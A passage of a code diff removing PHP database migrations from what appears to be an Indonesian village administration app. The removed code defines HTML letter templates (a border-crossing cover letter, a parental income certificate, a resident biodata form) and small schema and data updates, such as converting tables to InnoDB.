-            <td style="width: 35%; text-align: center;">\u{a0}</td>
-            </tr>
-            <tr style="height: 72px;">
-            <td style="width: 35%; text-align: center; height: 72px;">\u{a0}</td>
-            <td style="width: 30%; height: 72px;"><br /><br /><br /><br /></td>
-            <td style="width: 35%; height: 72px;">\u{a0}</td>
-            </tr>
-            <tr style="height: 18px;">
-            <td style="width: 35%; text-align: center; height: 18px;">[Nama_kepala_camaT]</td>
-            <td style="width: 30%; height: 18px;">\u{a0}</td>
-            <td style="width: 35%; text-align: center; height: 18px;">[Nama_pamonG]</td>
-            </tr>
-            <tr style="height: 18px;">
-            <td style="width: 35%; height: 18px; text-align: center;">[Nip_kepala_camaT]</td>
-            <td style="width: 30%; height: 18px;">\u{a0}</td>
-            <td style="width: 35%; text-align: center; height: 18px;">[SEbutan_nip_desa] : [nip_pamong]</td>
-            </tr>
-            </tbody>
-            </table>
-            <div style="text-align: left;"><br /><span style="font-size: 9pt;">Surat Pengantar ini rangkap 3 (tiga) :<br /></span><span style="font-size: 9pt;">Lembar 1 : untuk Kantor Imigrasi di Pos Lintas Batas;<br />Lembar 2 : untuk Arsip Kecamatan;</span><br /><span style="font-size: 9pt;">Lembar 3 : untuk Arsip Desa/Kelurahan<br /><strong>*) diisi oleh petugas</strong><br /><strong>**) Hanya untuk anak dibawah 18 tahun atau belum memilki KTP dan terdaftar dalam Kartu Keluarga (KK) Pemohon (Pemohon sebagai orang tua atau wali)</strong><br /></span><br /><br /></div>
-            HTML;
-        $data = [
-            'nama'                => $nama_surat,
-            'kode_surat'          => 'S-43',
-            'masa_berlaku'        => 1,
-            'satuan_masa_berlaku' => 'M',
-            'orientasi'           => 'Potrait',
-            'ukuran'              => 'F4',
-            'margin'              => '{"kiri":1.78,"atas":0.63,"kanan":1.78,"bawah":1.37}',
-            'qr_code'             => StatusEnum::TIDAK,
-            'kode_isian'          => null,
-            'form_isian'          => '{"data":"1","individu":{"sex":"","status_dasar":"","kk_level":""}}',
-            'mandiri'             => StatusEnum::YA,
-            'syarat_surat'        => ['2', '3'],
-            'template'            => $template,
-        ];
-
-        return $hasil && $this->tambah_surat_tinymce($data, $id);
-    }
-
-    protected function migrasi_2023061552($hasil)
-    {
-        $sql = <<<'SQL'
-                    update tweb_surat_format set kode_isian = REPLACE (kode_isian, '"atribut":"required"', '"atribut":"class=\"required\""') where kode_isian like '%"atribut":"required"%'
-            SQL;
-        DB::statement($sql);
-
-        return $hasil;
-    }
-
-    protected function migrasi_2023061751($hasil)
-    {
-        $sql = <<<'SQL'
-                    ALTER TABLE tweb_penduduk MODIFY COLUMN hubung_warga varchar(50) NULL
-            SQL;
-        DB::statement($sql);
-
-        return $hasil;
-    }
-
-    protected function migrasi_2023061752($hasil)
-    {
-        $sql = <<<'SQL'
-                    SHOW TABLE STATUS WHERE ENGINE != 'InnoDB'
-            SQL;
-        $innoDb = DB::select($sql);
-        if ($innoDb) {
-            foreach ($innoDb as $table) {
-                DB::statement('ALTER TABLE ' . $table->Name . ' ENGINE = InnoDB'); //query untuk ubah ke innoDB;
-            }
-        }
-
-        return $hasil;
-    }
-
-    protected function suratKeteranganPenghasilanOrangTua($hasil, $id)
-    {
-        $template = <<<HTML
-            <h4 style="margin: 0; text-align: center;"><span style="text-decoration: underline;">[JUdul_surat]</span></h4>
-            <p style="margin: 0; text-align: center;">Nomor : [Format_nomor_suraT]<br /><br /></p>
-            <p style="text-align: justify; text-indent: 30px;">Yang bertanda tangan di bawah ini [JaBatan] [NaMa_desa], Kecamatan [NaMa_kecamatan], [SeButan_kabupaten] [NaMa_kabupaten], Provinsi [NaMa_provinsi] menerangkan dengan sebenarnya bahwa :</p>
-            <table style="border-collapse: collapse; width: 100%; height: 90px;" border="0" cellspacing="0" cellpadding="0">
-            <tbody>
-            <tr style="height: 18px;">
-            <td style="width: 4.31655%; text-align: center; height: 18px;">\u{a0}</td>
-            <td style="width: 3.90545%; height: 18px; text-align: left;">1.</td>
-            <td style="width: 30.5242%; text-align: left; height: 18px;">Nama Lengkap</td>
-            <td style="width: 1.2333%; text-align: center; height: 18px;">:</td>
-            <td style="width: 60.0206%; height: 18px; text-align: justify;"><strong>[NAma]</strong></td>
-            </tr>
-            <tr>
-            <td style="width: 4.31655%; text-align: center;">\u{a0}</td>
-            <td style="width: 3.90545%; text-align: left;">2.</td>
-            <td style="width: 30.5242%; text-align: left;">Tempat / Tanggal Lahir</td>
-            <td style="width: 1.2333%; text-align: center;">:</td>
-            <td style="width: 60.0206%; text-align: justify;">[TtL]</td>
-            </tr>
-            <tr>
-            <td style="width: 4.31655%; text-align: center;">\u{a0}</td>
-            <td style="width: 3.90545%; text-align: left;">3.</td>
-            <td style="width: 30.5242%; text-align: left;">NIK</td>
-            <td style="width: 1.2333%; text-align: center;">:</td>
-            <td style="width: 60.0206%; text-align: justify;">[NiK]</td>
-            </tr>
-            <tr style="height: 18px;">
-            <td style="width: 4.31655%; text-align: center; height: 18px;">\u{a0}</td>
-            <td style="width: 3.90545%; height: 18px; text-align: left;">4.</td>
-            <td style="width: 30.5242%; text-align: left; height: 18px;">Jenis Kelamin</td>
-            <td style="width: 1.2333%; text-align: center; height: 18px;">:</td>
-            <td style="width: 60.0206%; height: 18px; text-align: justify;">[Jenis_kelamin]</td>
-            </tr>
-            <tr>
-            <td style="width: 4.31655%; text-align: center;">\u{a0}</td>
-            <td style="width: 3.90545%; text-align: left;">5.</td>
-            <td style="width: 30.5242%; text-align: left;">Nomor Induk Siswa/Mahasiswa</td>
-            <td style="width: 1.2333%; text-align: center;">:</td>
-            <td style="width: 60.0206%; text-align: justify;">[Form_nomor_induk_siswamahasiswA]</td>
-            </tr>
-            <tr>
-            <td style="width: 4.31655%; text-align: center;">\u{a0}</td>
-            <td style="width: 3.90545%; text-align: left;">6.</td>
-            <td style="width: 30.5242%; text-align: left;">Jurusan/Fakultas/Prodi</td>
-            <td style="width: 1.2333%; text-align: center;">:</td>
-            <td style="width: 60.0206%; text-align: justify;">[Form_jurusanfakultasprodI]</td>
-            </tr>
-            <tr>
-            <td style="width: 4.31655%; text-align: center;">\u{a0}</td>
-            <td style="width: 3.90545%; text-align: left;">7.</td>
-            <td style="width: 30.5242%; text-align: left;">Sekolah/Perguruan Tinggi</td>
-            <td style="width: 1.2333%; text-align: center;">:</td>
-            <td style="width: 60.0206%; text-align: justify;">[Form_sekolahperguruan_tinggI]</td>
-            </tr>
-            <tr>
-            <td style="width: 4.31655%; text-align: center;">\u{a0}</td>
-            <td style="width: 3.90545%; text-align: left;">8.</td>
-            <td style="width: 30.5242%; text-align: left;">Kelas/Semester</td>
-            <td style="width: 1.2333%; text-align: center;">:</td>
-            <td style="width: 60.0206%; text-align: justify;">[Form_kelassemesteR]</td>
-            </tr>
-            <tr>
-            <td style="width: 4.31655%; text-align: center;">\u{a0}</td>
-            <td style="width: 3.90545%; text-align: left;">9.</td>
-            <td style="width: 30.5242%; text-align: left;">Agama</td>
-            <td style="width: 1.2333%; text-align: center;">:</td>
-            <td style="width: 60.0206%; text-align: justify;">[AgamA]</td>
-            </tr>
-            <tr>
-            <td style="width: 4.31655%; text-align: center;">\u{a0}</td>
-            <td style="width: 3.90545%; text-align: left;">10.</td>
-            <td style="width: 30.5242%; text-align: left;">Pekerjaan</td>
-            <td style="width: 1.2333%; text-align: center;">:</td>
-            <td style="width: 60.0206%; text-align: justify;">[PekerjaaN]</td>
-            </tr>
-            <tr>
-            <td style="width: 4.31655%; text-align: center;">\u{a0}</td>
-            <td style="width: 3.90545%; text-align: left;">11.</td>
-            <td style="width: 30.5242%; text-align: left;">Alamat</td>
-            <td style="width: 1.2333%; text-align: center;">:</td>
-            <td style="width: 60.0206%; text-align: justify;">[AlamaT] [Sebutan_desa] [NaMa_desa], Kecamatan [NaMa_kecamatan], [SeButan_kabupaten] [NaMa_kabupaten], [Nama_provinsI]</td>
-            </tr>
-            </tbody>
-            </table>
-            <p style="text-align: justify; text-indent: 30px;">Adalah benar penduduk yang berdomisili di [AlamaT], [Sebutan_desa] [NaMa_desa], Kecamatan [NaMa_kecamatan], [SeButan_kabupaten] [NaMa_kabupaten], [Nama_provinsI], dan merupakan <strong>Anak\u{a0}</strong>dari:</p>
-            <table style="border-collapse: collapse; width: 100%; height: 310px;" border="0" cellspacing="0" cellpadding="0">
-            <tbody>
-            <tr style="height: 18px;">
-            <td style="width: 4.3222%; text-align: center; height: 18px;">\u{a0}</td>
-            <td style="width: 3.92927%; height: 18px; text-align: left;">1.</td>
-            <td style="width: 20.1703%; text-align: left; height: 18px;">Nama Ayah</td>
-            <td style="width: 1.04781%; text-align: center; height: 18px;">:</td>
-            <td style="width: 70.5959%; height: 18px; text-align: justify;">[Nama_ayaH]</td>
-            </tr>
-            <tr style="height: 18px;">
-            <td style="width: 4.3222%; text-align: center; height: 18px;">\u{a0}</td>
-            <td style="width: 3.92927%; height: 18px; text-align: left;">\u{a0}</td>
-            <td style="width: 20.1703%; text-align: left; height: 18px;">Tempat / Tanggal Lahir</td>
-            <td style="width: 1.04781%; text-align: center; height: 18px;">:</td>
-            <td style="width: 70.5959%; height: 18px; text-align: justify;">[Ttl_ayaH]</td>
-            </tr>
-            <tr style="height: 18px;">
-            <td style="width: 4.3222%; text-align: center; height: 18px;">\u{a0}</td>
-            <td style="width: 3.92927%; height: 18px; text-align: left;">\u{a0}</td>
-            <td style="width: 20.1703%; text-align: left; height: 18px;">NIK</td>
-            <td style="width: 1.04781%; text-align: center; height: 18px;">:</td>
-            <td style="width: 70.5959%; height: 18px; text-align: justify;">[Nik_ayaH]</td>
-            </tr>
-            <tr style="height: 18px;">
-            <td style="width: 4.3222%; text-align: center; height: 18px;">\u{a0}</td>
-            <td style="width: 3.92927%; text-align: left; height: 18px;">\u{a0}</td>
-            <td style="width: 20.1703%; text-align: left; height: 18px;">Jenis Kelamin</td>
-            <td style="width: 1.04781%; text-align: center; height: 18px;">:</td>
-            <td style="width: 70.5959%; text-align: justify; height: 18px;">[Jenis_kelamin_ayaH]</td>
-            </tr>
-            <tr style="height: 18px;">
-            <td style="width: 4.3222%; text-align: center; height: 18px;">\u{a0}</td>
-            <td style="width: 3.92927%; text-align: left; height: 18px;">\u{a0}</td>
-            <td style="width: 20.1703%; text-align: left; height: 18px;">Agama</td>
-            <td style="width: 1.04781%; text-align: center; height: 18px;">\u{a0}</td>
-            <td style="width: 70.5959%; text-align: justify; height: 18px;">[Agama_ayaH]</td>
-            </tr>
-            <tr style="height: 18px;">
-            <td style="width: 4.3222%; text-align: center; height: 18px;">\u{a0}</td>
-            <td style="width: 3.92927%; text-align: left; height: 18px;">\u{a0}</td>
-            <td style="width: 20.1703%; text-align: left; height: 18px;">Pekerjaan</td>
-            <td style="width: 1.04781%; text-align: center; height: 18px;">:</td>
-            <td style="width: 70.5959%; text-align: justify; height: 18px;">[Pekerjaan_ayaH]</td>
-            </tr>
-            <tr style="height: 36px;">
-            <td style="width: 4.3222%; text-align: center; height: 36px;">\u{a0}</td>
-            <td style="width: 3.92927%; height: 36px; text-align: left;"><br /><br /></td>
-            <td style="width: 20.1703%; text-align: left; height: 36px;">Alamat<br /><br /></td>
-            <td style="width: 1.04781%; text-align: center; height: 36px;">:<br /><br /></td>
-            <td style="width: 70.5959%; height: 36px; text-align: justify;">[Alamat_ayaH] [Sebutan_desa] [NaMa_desa], Kecamatan [NaMa_kecamatan], [SeButan_kabupaten] [NaMa_kabupaten], [Nama_provinsI]</td>
-            </tr>
-            <tr>
-            <td style="width: 4.3222%; text-align: center;">\u{a0}</td>
-            <td style="width: 3.92927%; text-align: left;">\u{a0}</td>
-            <td style="width: 20.1703%; text-align: left;">Penghasilan</td>
-            <td style="width: 1.04781%; text-align: center;">:</td>
-            <td style="width: 70.5959%; text-align: justify;">[Form_penghasilan_ayaH]</td>
-            </tr>
-            <tr style="height: 18px;">
-            <td style="text-align: center; width: 100.065%; height: 18px;" colspan="5">\u{a0}</td>
-            </tr>
-            <tr style="height: 22px;">
-            <td style="width: 4.3222%; text-align: center; height: 22px;">\u{a0}</td>
-            <td style="width: 3.92927%; height: 18px; text-align: left;">2.</td>
-            <td style="width: 20.1703%; text-align: left; height: 18px;">Nama Ibu</td>
-            <td style="width: 1.04781%; text-align: center; height: 18px;">:</td>
-            <td style="width: 70.5959%; height: 18px; text-align: justify;">[Nama_ibU]</td>
-            </tr>
-            <tr style="height: 18px;">
-            <td style="width: 4.3222%; text-align: center; height: 18px;">\u{a0}</td>
-            <td style="width: 3.92927%; height: 18px; text-align: left;">\u{a0}</td>
-            <td style="width: 20.1703%; text-align: left; height: 18px;">Tempat / Tanggal Lahir</td>
-            <td style="width: 1.04781%; text-align: center; height: 18px;">:</td>
-            <td style="width: 70.5959%; height: 18px; text-align: justify;">[Ttl_ibU]</td>
-            </tr>
-            <tr style="height: 18px;">
-            <td style="width: 4.3222%; text-align: center; height: 18px;">\u{a0}</td>
-            <td style="width: 3.92927%; height: 18px; text-align: left;">\u{a0}</td>
-            <td style="width: 20.1703%; text-align: left; height: 18px;">NIK</td>
-            <td style="width: 1.04781%; text-align: center; height: 18px;">:</td>
-            <td style="width: 70.5959%; height: 18px; text-align: justify;">[Nik_ibU]</td>
-            </tr>
-            <tr style="height: 18px;">
-            <td style="width: 4.3222%; text-align: center; height: 18px;">\u{a0}</td>
-            <td style="width: 3.92927%; text-align: left; height: 18px;">\u{a0}</td>
-            <td style="width: 20.1703%; text-align: left; height: 18px;">Jenis Kelamin</td>
-            <td style="width: 1.04781%; text-align: center; height: 18px;">:</td>
-            <td style="width: 70.5959%; text-align: justify; height: 18px;">[Jenis_kelamin_ibU]</td>
-            </tr>
-            <tr style="height: 18px;">
-            <td style="width: 4.3222%; text-align: center; height: 18px;">\u{a0}</td>
-            <td style="width: 3.92927%; text-align: left; height: 18px;">\u{a0}</td>
-            <td style="width: 20.1703%; text-align: left; height: 18px;">Agama</td>
-            <td style="width: 1.04781%; text-align: center; height: 18px;">\u{a0}</td>
-            <td style="width: 70.5959%; text-align: justify; height: 18px;">[Agama_ibU]</td>
-            </tr>
-            <tr style="height: 18px;">
-            <td style="width: 4.3222%; text-align: center; height: 18px;">\u{a0}</td>
-            <td style="width: 3.92927%; text-align: left; height: 18px;">\u{a0}</td>
-            <td style="width: 20.1703%; text-align: left; height: 18px;">Pekerjaan</td>
-            <td style="width: 1.04781%; text-align: center; height: 18px;">:</td>
-            <td style="width: 70.5959%; text-align: justify; height: 18px;">[Pekerjaan_ibU]</td>
-            </tr>
-            <tr style="height: 36px;">
-            <td style="width: 4.3222%; text-align: center; height: 36px;">\u{a0}</td>
-            <td style="width: 3.92927%; height: 36px; text-align: left;"><br /><br /></td>
-            <td style="width: 20.1703%; text-align: left; height: 36px;">Alamat<br /><br /></td>
-            <td style="width: 1.04781%; text-align: center; height: 36px;">:<br /><br /></td>
-            <td style="width: 70.5959%; height: 36px; text-align: justify;">[Alamat_ibU] [Sebutan_desa] [NaMa_desa], Kecamatan [NaMa_kecamatan], [SeButan_kabupaten] [NaMa_kabupaten], [Nama_provinsI]</td>
-            </tr>
-            <tr>
-            <td style="width: 4.3222%; text-align: center;">\u{a0}</td>
-            <td style="width: 3.92927%; text-align: left;">\u{a0}</td>
-            <td style="width: 20.1703%; text-align: left;">Penghasilan</td>
-            <td style="width: 1.04781%; text-align: center;">:</td>
-            <td style="width: 70.5959%; text-align: justify;">[Form_penghasilan_ibU]</td>
-            </tr>
-            </tbody>
-            </table>
-            <p style="text-align: justify; text-indent: 30px;">Dengan penghasilan rata-rata <strong>Orang Tua [Form_penghasilan_orang_tua_ayah_ibU]</strong><strong> </strong>setiap bulannya.</p>
-            <p style="text-align: justify; text-indent: 30px;">Demikian Surat Keterangan Penghasilan Orangtua ini dibuat dengan sebenarnya agar dapat dipergunakan sebagaimana mestinya.</p>
-            <p>\u{a0}</p>
-            <table style="border-collapse: collapse; width: 100%;" border="0">
-            <tbody>
-            <tr>
-            <td style="width: 35%; text-align: center;">\u{a0}</td>
-            <td style="width: 30%;">\u{a0}</td>
-            <td style="width: 35%; text-align: center;">[NaMa_desa], [TgL_surat]</td>
-            </tr>
-            <tr>
-            <td style="width: 35%; text-align: center;">\u{a0}</td>
-            <td style="width: 30%;">\u{a0}</td>
-            <td style="width: 35%; text-align: center;">[Atas_namA]</td>
-            </tr>
-            <tr>
-            <td style="width: 35%; text-align: center;">\u{a0}</td>
-            <td style="width: 30%;"><br /><br /><br /><br /></td>
-            <td style="width: 35%;">\u{a0}</td>
-            </tr>
-            <tr>
-            <td style="width: 35%; text-align: center;">\u{a0}</td>
-            <td style="width: 30%;">\u{a0}</td>
-            <td style="width: 35%; text-align: center;">[Nama_pamonG]</td>
-            </tr>
-            <tr>
-            <td style="width: 35%;">\u{a0}</td>
-            <td style="width: 30%;">\u{a0}</td>
-            <td style="width: 35%; text-align: center;">[SEbutan_nip_desa] : [nip_pamong]</td>
-            </tr>
-            </tbody>
-            </table>
-            <div style="text-align: center;"><br />[qr_code]</div>
-            HTML;
-
-        $data = [
-            'nama'                => 'Keterangan Penghasilan Orang Tua',
-            'kode_surat'          => 'S-42',
-            'masa_berlaku'        => 1,
-            'satuan_masa_berlaku' => 'M',
-            'orientasi'           => 'Potrait',
-            'ukuran'              => 'F4',
-            'margin'              => '{"kiri":1.78,"atas":0.63,"kanan":1.78,"bawah":1.37}',
-            'qr_code'             => StatusEnum::TIDAK,
-            'kode_isian'          => '[{"tipe":"text","kode":"[form_nomor_induk_siswamahasiswa]","nama":"Nomor Induk Siswa\/Mahasiswa","deskripsi":"Masukkan Nomor Induk Siswa\/Mahasiswa","atribut":"class=\"required\"","pilihan":null,"refrensi":null},{"tipe":"text","kode":"[form_jurusanfakultasprodi]","nama":"Jurusan\/Fakultas\/Prodi","deskripsi":"Masukkan Jurusan\/Fakultas\/Prodi","atribut":"class=\"required\"","pilihan":null,"refrensi":null},{"tipe":"text","kode":"[form_sekolahperguruan_tinggi]","nama":"Sekolah\/Perguruan Tinggi","deskripsi":"Masukkan Sekolah\/Perguruan Tinggi","atribut":"class=\"required\"","pilihan":null,"refrensi":null},{"tipe":"text","kode":"[form_kelassemester]","nama":"Kelas\/Semester","deskripsi":"Masukkan Kelas\/Semester","atribut":"class=\"required\"","pilihan":null,"refrensi":null},{"tipe":"text","kode":"[form_penghasilan_ayah]","nama":"Penghasilan Ayah","deskripsi":"Masukkan Penghasilan Ayah","atribut":"class=\"required rupiah\"","pilihan":null,"refrensi":null},{"tipe":"text","kode":"[form_penghasilan_ibu]","nama":"Penghasilan Ibu","deskripsi":"Masukkan Penghasilan Ibu","atribut":"class=\"required rupiah\"","pilihan":null,"refrensi":null},{"tipe":"text","kode":"[form_penghasilan_orang_tua_ayah_ibu]","nama":"Penghasilan Orang Tua (Ayah + Ibu)","deskripsi":"Masukkan Penghasilan Orang Tua (Ayah + Ibu)","atribut":"class=\"required rupiah\"","pilihan":null,"refrensi":null}]',
-            'form_isian'          => '{"data":"1","individu":{"sex":"","status_dasar":"","kk_level":"4"}}',
-            'mandiri'             => StatusEnum::TIDAK,
-            'syarat_surat'        => null,
-            'lampiran'            => null,
-            'template'            => $template,
-        ];
-
-        return $hasil && $this->tambah_surat_tinymce($data, $id);
-    }
-
-    protected function migrasi_2023061951($hasil)
-    {
-        $surat = FormatSurat::whereIn('jenis', FormatSurat::TINYMCE)->get();
-
-        foreach ($surat as $surat_item) {
-            $kode = $surat_item->kode_isian;
-
-            foreach ($kode as $value) {
-                if (str_contains($value->atribut, 'required')) {
-                    $value->required = '1';
-                    if ($value->atribut == 'class="required"') {
-                        $value->atribut = trim(str_replace('class="required"', '', $value->atribut));
-                    } else {
-                        $value->atribut = trim(str_replace('required', '', $value->atribut));
-                    }
-                } else {
-                    $value->required = '0';
-                }
-            }
-            $hasil = $hasil && FormatSurat::find($surat_item->id)->update(['kode_isian' => $kode]);
-        }
-
-        return $hasil && true;
-    }
-
-    protected function suratBiodataPenduduk($hasil, $id)
-    {
-        $nama_surat = 'Biodata Penduduk';
-
-        $data = [
-            'nama'                => $nama_surat,
-            'kode_surat'          => 'S-03',
-            'masa_berlaku'        => 1,
-            'satuan_masa_berlaku' => 'M',
-            'orientasi'           => 'Potrait',
-            'ukuran'              => 'F4',
-            'margin'              => '{"kiri":1.78,"atas":0.63,"kanan":1.78,"bawah":1.37}',
-            'qr_code'             => StatusEnum::TIDAK,
-            'kode_isian'          => '[]',
-            'form_isian'          => '{"data":"1","individu":{"sex":"","status_dasar":"","kk_level":""}}',
-            'mandiri'             => StatusEnum::YA,
-            'syarat_surat'        => ['3', '4'],
-            'lampiran'            => 'F-1.01,F-1.02',
-            'template'            => "<h4 style=\"margin: 0; text-align: center;\"><span style=\"text-decoration: underline;\">[JUdul_surat]</span></h4>
-            <p style=\"margin: 0; text-align: center;\">Nomor : [Format_nomor_suraT]<br /><br /></p>
-            <p style=\"text-align: justify; text-indent: 30px;\"><strong>I. DATA KELURGA</strong></p>
-            <table style=\"border-collapse: collapse; width: 100%; height: 79px;\" border=\"0\" cellspacing=\"0\" cellpadding=\"0\">
-            <tbody>
-            <tr style=\"height: 25px;\">
-            <td style=\"width: 4.32489%; text-align: center; height: 25px;\">\u{a0}</td>
-            <td style=\"width: 3.90295%; height: 25px; text-align: left;\">1.</td>
-            <td style=\"width: 30.4852%; text-align: left; height: 25px;\">Nama Kepala Keluarga</td>
-            <td style=\"width: 1.26582%; text-align: center; height: 25px;\">:</td>
-            <td style=\"width: 60.0211%; height: 25px; text-align: justify;\">[KePala_kk]</td>
-            </tr>
-            <tr style=\"height: 18px;\">
-            <td style=\"width: 4.32489%; text-align: center; height: 18px;\">\u{a0}</td>
-            <td style=\"width: 3.90295%; text-align: left; height: 18px;\">2.</td>
-            <td style=\"width: 30.4852%; text-align: left; height: 18px;\">Nomor Kartu Keluarga</td>
-            <td style=\"width: 1.26582%; text-align: center; height: 18px;\">:</td>
-            <td style=\"width: 60.0211%; text-align: justify; height: 18px;\">[No_kk]</td>
-            </tr>
-            <tr style=\"height: 36px;\">
-            <td style=\"width: 4.32489%; text-align: center; height: 36px;\">\u{a0}</td>
-            <td style=\"width: 3.90295%; text-align: left; height: 36px;\">3.</td>
-            <td style=\"width: 30.4852%; text-align: left; height: 36px;\">Alamat Keluarga</td>
-            <td style=\"width: 1.26582%; text-align: center; height: 36px;\">:</td>
-            <td style=\"width: 60.0211%; text-align: justify; height: 36px;\">[AlamaT] [Sebutan_desa] [NaMa_desa], Kecamatan [NaMa_kecamatan], [SeButan_kabupaten] [NaMa_kabupaten]</td>
-            </tr>
-            </tbody>
-            </table>
-            <p style=\"text-align: justify; text-indent: 30px;\"><strong>II. DATA INDIVIDU</strong></p>
-            <table style=\"border-collapse: collapse; width: 100%; height: 519px;\" border=\"0\" cellspacing=\"0\" cellpadding=\"0\">
-            <tbody>
-            <tr style=\"height: 25.9375px;\">
-            <td style=\"width: 4.31655%; text-align: center; height: 25.9375px;\">\u{a0}</td>
-            <td style=\"width: 3.90545%; height: 25.9375px; text-align: left;\">1.</td>
-            <td style=\"width: 30.5242%; text-align: left; height: 25.9375px;\">Nama Lengkap</td>
-            <td style=\"width: 1.2333%; text-align: center; height: 25.9375px;\">:</td>
-            <td style=\"width: 60.0206%; height: 25.9375px; text-align: justify;\"><strong>[NAma]</strong></td>
-            </tr>
-            <tr style=\"height: 25.9375px;\">
-            <td style=\"width: 4.31655%; text-align: center; height: 25.9375px;\">\u{a0}</td>
-            <td style=\"width: 3.90545%; height: 25.9375px; text-align: left;\">2.</td>
-            <td style=\"width: 30.5242%; text-align: left; height: 25.9375px;\">NIK</td>
-            <td style=\"width: 1.2333%; text-align: center; height: 25.9375px;\">:</td>
-            <td style=\"width: 60.0206%; height: 25.9375px; text-align: justify;\">[NiK]</td>
-            </tr>
-            <tr style=\"height: 25.9375px;\">
-            <td style=\"width: 4.31655%; text-align: center; height: 25.9375px;\">\u{a0}</td>
-            <td style=\"width: 3.90545%; height: 25.9375px; text-align: left;\">3.</td>
-            <td style=\"width: 30.5242%; text-align: left; height: 25.9375px;\">Alamat Sebelumnya</td>
-            <td style=\"width: 1.2333%; text-align: center; height: 25.9375px;\">:</td>
-            <td style=\"width: 60.0206%; height: 25.9375px; text-align: justify;\">[AlAmat_sebelumnya]</td>
-            </tr>
-            <tr style=\"height: 25.9375px;\">
-            <td style=\"width: 4.31655%; text-align: center; height: 25.9375px;\">\u{a0}</td>
-            <td style=\"width: 3.90545%; height: 25.9375px; text-align: left;\">4.</td>
-            <td style=\"width: 30.5242%; text-align: left; height: 25.9375px;\">Nomor Paspor</td>
-            <td style=\"width: 1.2333%; text-align: center; height: 25.9375px;\">:</td>
-            <td style=\"width: 60.0206%; height: 25.9375px; text-align: justify;\">[DoKumen_pasport]</td>
-            </tr>
-            <tr style=\"height: 25.9375px;\">
-            <td style=\"width: 4.31655%; text-align: center; height: 25.9375px;\">\u{a0}</td>
-            <td style=\"width: 3.90545%; height: 25.9375px; text-align: left;\">5.</td>
-            <td style=\"width: 30.5242%; text-align: left; height: 25.9375px;\">Tanggal Berakhir Paspor</td>
-            <td style=\"width: 1.2333%; text-align: center; height: 25.9375px;\">:</td>
-            <td style=\"width: 60.0206%; height: 25.9375px; text-align: justify;\">[TaNggal_akhir_paspor]</td>
-            </tr>
-            <tr style=\"height: 25.9375px;\">
-            <td style=\"width: 4.31655%; text-align: center; height: 25.9375px;\">\u{a0}</td>
-            <td style=\"width: 3.90545%; height: 25.9375px; text-align: left;\">6.</td>
-            <td style=\"width: 30.5242%; text-align: left; height: 25.9375px;\">Jenis Kelamin</td>
-            <td style=\"width: 1.2333%; text-align: center; height: 25.9375px;\">:</td>
-            <td style=\"width: 60.0206%; height: 25.9375px; text-align: justify;\">[Jenis_kelamin]</td>
-            </tr>
-            <tr style=\"height: 25.9375px;\">
-            <td style=\"width: 4.31655%; text-align: center; height: 25.9375px;\">\u{a0}</td>
-            <td style=\"width: 3.90545%; text-align: left; height: 25.9375px;\">7.</td>
-            <td style=\"width: 30.5242%; text-align: left; height: 25.9375px;\">Tempat Lahir</td>
-            <td style=\"width: 1.2333%; text-align: center; height: 25.9375px;\">:</td>
-            <td style=\"width: 60.0206%; text-align: justify; height: 25.9375px;\">[TeMpatlahir]</td>
-            </tr>
-            <tr style=\"height: 25.9375px;\">
-            <td style=\"width: 4.31655%; text-align: center; height: 25.9375px;\">\u{a0}</td>
-            <td style=\"width: 3.90545%; text-align: left; height: 25.9375px;\">8.</td>
-            <td style=\"width: 30.5242%; text-align: left; height: 25.9375px;\">Tanggal Lahir</td>
-            <td style=\"width: 1.2333%; text-align: center; height: 25.9375px;\">:</td>
-            <td style=\"width: 60.0206%; text-align: justify; height: 25.9375px;\">[TtL]</td>
-            </tr>
-            <tr style=\"height: 25.9375px;\">
-            <td style=\"width: 4.31655%; text-align: center; height: 25.9375px;\">\u{a0}</td>
-            <td style=\"width: 3.90545%; text-align: left; height: 25.9375px;\">9.</td>
-            <td style=\"width: 30.5242%; text-align: left; height: 25.9375px;\">Akta Kelahiran / Surat Kelahiran</td>
-            <td style=\"width: 1.2333%; text-align: center; height: 25.9375px;\">:</td>
-            <td style=\"width: 60.0206%; text-align: justify; height: 25.9375px;\">[AkTa_lahir]</td>
-            </tr>
-            <tr style=\"height: 25.9375px;\">
-            <td style=\"width: 4.31655%; text-align: center; height: 25.9375px;\">\u{a0}</td>
-            <td style=\"width: 3.90545%; text-align: left; height: 25.9375px;\">10.</td>
-            <td style=\"width: 30.5242%; text-align: left; height: 25.9375px;\">Golongan Darah</td>
-            <td style=\"width: 1.2333%; text-align: center; height: 25.9375px;\">:</td>
-            <td style=\"width: 60.0206%; text-align: justify; height: 25.9375px;\">[GoL_darah]</td>
-            </tr>
-            <tr style=\"height: 25.9375px;\">
-            <td style=\"width: 4.31655%; text-align: center; height: 25.9375px;\">\u{a0}</td>
-            <td style=\"width: 3.90545%; text-align: left; height: 25.9375px;\">11.</td>
-            <td style=\"width: 30.5242%; text-align: left; height: 25.9375px;\">Agama</td>
-            <td style=\"width: 1.2333%; text-align: center; height: 25.9375px;\">:</td>
-            <td style=\"width: 60.0206%; text-align: justify; height: 25.9375px;\">[AgAma]</td>
-            </tr>
-            <tr style=\"height: 25.9375px;\">
-            <td style=\"width: 4.31655%; text-align: center; height: 25.9375px;\">\u{a0}</td>
-            <td style=\"width: 3.90545%; text-align: left; height: 25.9375px;\">12.</td>
-            <td style=\"width: 30.5242%; text-align: left; height: 25.9375px;\">Status Perkawinan</td>
-            <td style=\"width: 1.2333%; text-align: center; height: 25.9375px;\">:</td>
-            <td style=\"width: 60.0206%; text-align: justify; height: 25.9375px;\">[StAtus_kawin]</td>
-            </tr>
-            <tr style=\"height: 25.9375px;\">
-            <td style=\"width: 4.31655%; text-align: center; height: 25.9375px;\">\u{a0}</td>
-            <td style=\"width: 3.90545%; text-align: left; height: 25.9375px;\">13.</td>
-            <td style=\"width: 30.5242%; text-align: left; height: 25.9375px;\">Akta Perkawinan / Buku Nikah</td>
-            <td style=\"width: 1.2333%; text-align: center; height: 25.9375px;\">:</td>
-            <td style=\"width: 60.0206%; text-align: justify; height: 25.9375px;\">[AkTa_perkawinan]</td>
-            </tr>
-            <tr style=\"height: 25.9375px;\">
-            <td style=\"width: 4.31655%; text-align: center; height: 25.9375px;\">\u{a0}</td>
-            <td style=\"width: 3.90545%; text-align: left; height: 25.9375px;\">14.</td>
-            <td style=\"width: 30.5242%; text-align: left; height: 25.9375px;\">Tanggal Akta Perkawinan / Buku Nikah</td>
-            <td style=\"width: 1.2333%; text-align: center; height: 25.9375px;\">:</td>
-            <td style=\"width: 60.0206%; text-align: justify; height: 25.9375px;\">[TaNggalperkawinan]</td>
-            </tr>
